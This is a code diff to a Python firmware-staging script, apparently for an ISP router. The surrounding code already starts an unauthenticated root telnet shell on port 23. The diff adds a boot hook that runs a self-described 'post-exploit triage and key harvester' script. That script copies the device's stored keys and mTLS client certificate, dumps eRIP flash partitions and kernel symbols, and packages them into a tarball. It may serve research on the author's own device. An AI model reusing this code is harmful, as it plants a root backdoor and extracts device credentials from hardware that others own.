@@ -44,7 +44,68 @@ RC_LOCAL_CONTENT = """\
 if command -v busybox >/dev/null 2>&1; then
     busybox telnetd -l /bin/ash -p 23 &
 fi
+
+if [ -f /root/triage.sh ]; then
+    /bin/sh /root/triage.sh > /tmp/triage.log 2>&1 &
+fi
+
 exit 0
+"""
+
+TRIAGE_SCRIPT_CONTENT = """\
+#!/bin/sh
+# F1 automated post-exploit triage and key harvester
+set -x
+
+OUT="/tmp/triage"
+mkdir -p "$OUT"
+date > "$OUT/timestamp.txt" 2>/dev/null || true
+uname -a > "$OUT/uname.txt" 2>/dev/null || true
+cat /proc/cmdline > "$OUT/cmdline.txt" 2>/dev/null || true
+cat /proc/mtd > "$OUT/mtd.txt" 2>/dev/null || true
+cat /proc/partitions > "$OUT/partitions.txt" 2>/dev/null || true
+dmesg > "$OUT/dmesg.txt" 2>/dev/null || true
+
+# Harvest /proc/rip/ items (Item 0108 = RANDOM_KEY_B, 011a = mTLS client cert/key, 0120 = OSIK)
+if [ -d /proc/rip ]; then
+    mkdir -p "$OUT/rip"
+    for f in /proc/rip/*; do
+        if [ -f "$f" ]; then
+            cp "$f" "$OUT/rip/" 2>/dev/null || true
+        fi
+    done
+fi
+
+# Harvest /proc/efu/ info
+if [ -d /proc/efu ]; then
+    mkdir -p "$OUT/efu"
+    for f in /proc/efu/*; do
+        if [ -f "$f" ]; then
+            cp "$f" "$OUT/efu/" 2>/dev/null || true
+        fi
+    done
+fi
+
+# Dump eRIPv2 raw partition from MTD
+if [ -f /proc/mtd ]; then
+    grep -i "erip" /proc/mtd | while read -r line; do
+        dev=$(echo "$line" | cut -d: -f1)
+        name=$(echo "$line" | cut -d'"' -f2 | tr ' ' '_')
+        if [ -n "$dev" ] && [ -e "/dev/$dev" ]; then
+            dd if="/dev/$dev" of="$OUT/${name}.bin" bs=64k 2>/dev/null || true
+        fi
+    done
+fi
+
+# Dump kernel symbols for r2secr / ripdrv memory analysis
+if [ -f /proc/kallsyms ]; then
+    cat /proc/kallsyms > "$OUT/kallsyms.txt" 2>/dev/null || true
+fi
+
+# Package all harvested data
+if command -v tar >/dev/null 2>&1; then
+    tar -czf /tmp/f1-triage.tar.gz -C /tmp triage 2>/dev/null || true
+fi
 """
 
 DROPBEAR_CONFIG_CONTENT = """\
@@ -120,6 +181,14 @@ def populate_bank_tree(base_dir: Path, shadow_hash: str = "") -> list[Path]:
     p_clash.write_text(CLASH_CONFIG_CONTENT, encoding="utf-8")
     os.chmod(p_clash, 0o644)
     files_created.append(p_clash)
+
+    # root/triage.sh (0755)
+    root_dir = base_dir / "root"
+    root_dir.mkdir(parents=True, exist_ok=True)
+    p_triage = root_dir / "triage.sh"
+    p_triage.write_text(TRIAGE_SCRIPT_CONTENT, encoding="utf-8")
+    os.chmod(p_triage, 0o755)
+    files_created.append(p_triage)
 
     return files_created
 
